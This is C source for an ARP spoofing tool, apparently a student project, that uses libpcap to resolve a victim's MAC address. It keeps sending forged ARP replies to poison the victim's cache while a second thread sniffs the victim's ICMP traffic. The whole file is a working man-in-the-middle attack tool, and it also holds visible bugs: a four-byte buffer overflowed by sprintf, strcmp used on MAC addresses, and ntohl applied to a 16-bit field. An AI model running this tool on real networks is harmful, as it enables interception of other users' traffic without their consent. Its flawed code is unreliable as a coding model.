#include "spoofing.h"
#include <pthread.h>

void print_mac(u_char* mac){
	for(int i=0;i<6;i++){
		if(i!=5)
			printf("%02X:",mac[i]);
		else
			printf("%02X\n",mac[i]);
	}
}

void packet_dump(u_char* packet, int packet_len){
	for(int i=0;i<packet_len;i++){
		if(i!=0 && i%16==0)
			printf("\n");
		printf("%02X ",packet[i]);
	}
}

void make_etherhdr(struct etherhdr *ether, u_char *src_mac, u_char *dst_mac){
	memcpy(ether->dst,dst_mac,sizeof(ether->dst));
	memcpy(ether->src,src_mac,sizeof(ether->src));
	ether->ether_type = htons(ETH_ARP);
}

void make_arphdr(struct arphdr *arp, u_char *src_mac, u_char *dst_mac, struct in_addr *senderIP, struct in_addr *targetIP, int option){
	arp->htype = htons(ETHERNET);
	arp->ptype = htons(ETHERTYPE_IP);
	arp->hlen = ETHER_ADDR_LEN;
	arp->plen = 4;
	if(option == 0)
		arp->oper = htons(ARP_REQUEST);
	else
		arp->oper = htons(ARP_REPLY);
	memcpy(arp->sha,src_mac,sizeof(arp->sha));
	memcpy(arp->spa,senderIP,sizeof(arp->spa));
	memcpy(arp->tha,dst_mac,sizeof(arp->tha));
	memcpy(arp->tpa,targetIP,sizeof(arp->tpa));
}

u_char* arp_broad(pcap_t *handle, u_char *src_mac, u_char *dst_mac, struct in_addr *senderIP, struct in_addr *targetIP){
	struct etherhdr ether, *recv_ether;
	struct arphdr arp, *recv_arp;
	struct pcap_pkthdr *header;
	u_char *packet, *recv_packet;
	int packet_len;
	int broad_cast = 0;
	int flag;
	u_char *buf;
	struct in_addr recv_IP;
	int option = 0;

	make_etherhdr(&ether,src_mac,dst_mac);
	printf("\n[+] information of packet to send\n\n");
	printf("\t[-] destination MAC : "); print_mac(dst_mac);
	printf("\t[-] source MAC : "); print_mac(src_mac);
	printf("\t[-] ethernet type : 0x%x\n",ntohs(ether.ether_type));

	make_arphdr(&arp,src_mac,"\x00\x00\x00\x00\x00\x00",senderIP,targetIP,option);
	printf("\n\t[-] sneder MAC : "); print_mac(arp.sha);
	printf("\t[-[ sender IP : 0x"); for(int i=0;i<4;i++) printf("%02X",arp.spa[i]); printf("\n");
	printf("\t[-] target MAC : "); print_mac(arp.tha);
	printf("\t[-] target IP : 0x"); for(int i=0;i<4;i++) printf("%02X",arp.tpa[i]); printf("\n");

	packet_len = sizeof(ether)+sizeof(arp);
	packet = (u_char*)malloc(packet_len);
	memcpy(packet,&ether,sizeof(ether));
	memcpy(packet+sizeof(ether),&arp,sizeof(arp));

	printf("\n[-] send packet dump\n");
	packet_dump(packet,packet_len);
	printf("end\n\n");

	while(1){
		if(pcap_sendpacket(handle,packet,packet_len) == 0)
			break;
	}

		printf("[+] receiving sender MAC...\n");
	while(1){
		flag = pcap_next_ex(handle,&header,&recv_packet);
		if(flag == 0){
			printf("\t[-] time out! sending packet again...\n");
			if(pcap_sendpacket(handle,packet,packet_len) != 0){
				printf("\t[-] fail to send packet! restart the program\n");
				exit(1);
			}
		}
		else if(flag < 0){
			printf("\t[-] fail to send packet! restart the program\n");
			exit(1);
		}
		recv_ether = (struct etherhdr *)recv_packet;
		if(ntohs(recv_ether->ether_type) != 0x0806)
			continue;
		recv_arp = (struct arphdr *)(recv_packet+sizeof(struct etherhdr));
		if(ntohs(recv_arp->oper) != ARP_REPLY)
			continue;
		buf = (u_char*)malloc(4);
		sprintf(buf,"%d.%d.%d.%d",recv_arp->spa[0],recv_arp->spa[1],recv_arp->spa[2],recv_arp->spa[3]);
		inet_pton(AF_INET,buf,&recv_IP.s_addr);
		free(buf);
		if(memcmp(&recv_IP,targetIP,sizeof(recv_IP)))
			continue;
		printf("\n[+] result \n");
		printf("\t[-] reply IP : 0x"); for(int i=0;i<4;i++) printf("%02x",recv_arp->spa[i]); printf("\n");
		printf("\t[-] reply MAC : "); print_mac(recv_arp->sha);

		return recv_arp->sha;
	}
}

void arp_infect(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_addr *senderIP, struct in_addr *targetIP){
	u_char *packet;
	struct etherhdr ether, *recv_ether;
	struct arphdr arp_h, *recv_arp_h;
	u_char *recv_packet;
	struct pcap_pkthdr *header;
	int packet_len;
	int flag;
	struct in_addr recv_IP;
	u_char *recv_MAC;
	u_char *buf;
	u_char addr[4];
	int option;

	option = 1;
	make_etherhdr(&ether,my_mac,sender_mac);
	make_arphdr(&arp_h,my_mac,sender_mac,targetIP,senderIP,option);

	packet = (u_char*)malloc(sizeof(ether)+sizeof(arp_h));
	memcpy(packet,&ether,sizeof(ether));
	memcpy(packet+sizeof(ether),&arp_h,sizeof(arp_h));
	packet_len = sizeof(ether) + sizeof(arp_h);

	printf("\n[+] packet to send(packet length : %d \n",packet_len);
	packet_dump(packet,packet_len);
	printf("end\n\n");

	while(1){
		if(pcap_sendpacket(handle,packet,packet_len) == 0)
			break;
	}

	printf("\n[+] arp infection completed!\n\n");
}

void *infection(void *data){
	argu_group *argu = (argu_group *)data;
	pcap_t *handle = argu->handle;
	u_char *sender_mac = argu->sender_mac;
	u_char *target_mac = argu->target_mac;
	struct in_addr *senderIP = argu->senderIP;
	struct in_addr *targetIP = argu->targetIP;
/*
	print_mac(sender_mac);
	print_mac(target_mac);
	printf("%x\n%x\n",htonl(senderIP->s_addr),htonl(targetIP->s_addr));
*/
	while(1){
		//printf("while loop\n");
		arp_infect(handle, sender_mac, target_mac, senderIP, targetIP);
		printf("\t\t[*] arp spoofing...\n");
		sleep(2);
	}
}

void *sniff_packet(void *data){
	u_char *sender_mac = (u_char *)data;
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char *packet, *send_packet;
	int packet_len;
	struct pcap_pkthdr *header;
	int ret;
	struct etherhdr send_ether, *recv_ether;
	struct iphdr send_iphdr, *recv_iphdr;
	struct in_addr *ping_addr;
	int mod;

	handle = pcap_open_live("en0", BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL){
		printf("[+] cannot open device\n");
		exit(1);
	}

	if(pcap_datalink(handle) != DLT_EN10MB){
 		printf("\n[-] device do not provide ethernet header!\n");
 		exit(1);
 	}

	while(1){
		ret = pcap_next_ex(handle,&header,&packet);
		if(ret == 0){
			printf("[+] time out...\n");
			continue;
		}
		else if(ret < 0){
			printf("[+] fail to receive packet!\n");
			break;
		}
		else{
			recv_ether = (struct etherhdr *)packet;
			if(strcmp(recv_ether->src,sender_mac)) continue;
			if(ntohl(recv_ether->ether_type) != ETHERTYPE_IP) continue;
			recv_iphdr = (struct iphdr *)(packet+sizeof(struct etherhdr));
			if(recv_iphdr->ip_p != 1) continue;
			else{
				//ping_addr = (struct in_addr *)malloc(sizeof(struct in_addr));
				//ping_addr = recv_iphdr->ip_dst;
				if(packet[34] == 0) continue;
				else{
					send_packet = (u_char *)malloc(98);
					memcpy(send_packet,packet,98);
					printf("\n[*] send packet dump\n");
					packet_dump(send_packet,98);
					printf("end\n");
					free(send_packet);
				}
			}
		}
	}
}

int main(int argc, char* argv[])
{
	pcap_t *handle;
	struct pcap_pkthdr *header;
	u_char *packet, *recv_packet;
	u_char *dev, errbuf[PCAP_ERRBUF_SIZE];
	struct in_addr myIP, senderIP, targetIP;
	u_char *my_mac, *sender_mac;
	u_char addr[4];
	u_char buf[30];

	argu_group *argu;

	pthread_t p_thread[2];
	int status;
	int thr_id;

	if(argc < 4){
		printf("[+] Usage : %s [interface] [senderIP] [targetIP]\n");
		exit(1);
	}

	memset(buf,0,sizeof(buf));

	printf("\n[+] START PROGRAM ver 2.0!\n");
	printf("==================================================\n");
	dev = argv[1];
	inet_pton(AF_INET,argv[2],&senderIP.s_addr);
	inet_pton(AF_INET,argv[3],&targetIP.s_addr);
	printf("\n\t[-] interface : %s\n",dev);
	printf("\n\t[-] senderIP : %s // hex : 0x%X\n",argv[2],htonl(senderIP.s_addr));
	printf("\n\t[-] targetIP : %s // hex : 0x%x\n",argv[3],htonl(targetIP.s_addr));
	printf("\n==================================================\n");

 	my_mac = GetSvrMacAddress(dev);
 	printf("\n[+] my MAC : "); print_mac(my_mac);
 	s_get_IPAddress(dev,addr);
 	sprintf(buf,"%d.%d.%d.%d",(int)addr[0],(int)addr[1],(int)addr[2],(int)addr[3]);
 	inet_pton(AF_INET,buf,&myIP.s_addr);
 	printf("[+] my IP : %s // hex : 0x%x\n",buf,htonl(myIP.s_addr));

 	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if(handle == NULL){
 		printf("\n[-] fail to open device\n");
 		exit(1);
 	}
 	if(pcap_datalink(handle) != DLT_EN10MB){
 		printf("\n[-] device do not provide ethernet header!\n");
 		exit(1);
 	}

 	// ARP Broadcast
 	printf("\n[+] ARP Broadcast!\n");
 	sender_mac = arp_broad(handle,my_mac,"\xff\xff\xff\xff\xff\xff",&myIP,&senderIP);
 	arp_infect(handle,my_mac,sender_mac,&senderIP,&targetIP);
 	// ARP infection success


 	argu = (argu_group *)malloc(sizeof(argu_group));
 	argu->handle = handle;
 	argu->senderIP = &senderIP;
 	argu->sender_mac = my_mac;
 	argu->targetIP = &targetIP;
 	argu->target_mac = sender_mac;
 /*
 	print_mac(argu->sender_mac);
 	print_mac(argu->target_mac);
 	printf("%x\n%x\n",htonl(argu->senderIP->s_addr),htonl(argu->targetIP->s_addr));
 */
 	thr_id = pthread_create(&p_thread[0],NULL,infection,(void *)argu);
 	if(thr_id < 0){
 		printf("\n[-] pthread create error!\n");
 		exit(1);
 	}
 	else
 		printf("\n[-] pthread create success!\n");

 	thr_id = pthread_create(&p_thread[1],NULL,sniff_packet,(void *)sender_mac);
 	if(thr_id < 0){
 		printf("\n[-] pthread create error!\n");
 		exit(1);
 	}
 	else
 		printf("\n[-] pthread create success!\n");

 	pthread_join(p_thread[0], (void **)&status);
 	pthread_join(p_thread[1], (void **)&status);
 	free(argu);
	return 0;
}